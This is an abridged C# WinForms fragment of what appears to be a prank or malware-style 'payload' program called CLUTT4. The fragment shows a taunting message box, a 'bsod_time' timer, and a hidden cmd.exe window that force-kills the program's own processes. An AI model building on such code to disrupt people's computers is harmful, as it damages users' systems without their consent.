    ...
    public partial class Payload_start : Form
    {
        ...
        private void rectangles_Tick(object sender, EventArgs e)
        {
            if (normalshake)
            {
                ...
                {
                    special_msg = false;
                    MessageBox.Show("READY TO ENJOY :3?!", "CLUTT4", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
        ...
        private void bsod_time_Tick(object sender, EventArgs e)
        {
            bsod_time.Stop();
            tv_noise_dirty.Stop();
            ProcessStartInfo rip_snd = new ProcessStartInfo();
            rip_snd.FileName = "cmd.exe";
            rip_snd.WindowStyle = ProcessWindowStyle.Hidden;
            rip_snd.Arguments = @"/k taskkill /f /im media_snd.exe && taskkill /f /im Clutt4.1.exe && exit";
            Process.Start(rip_snd);
            Thread.Sleep(999999);
        }
    }
}
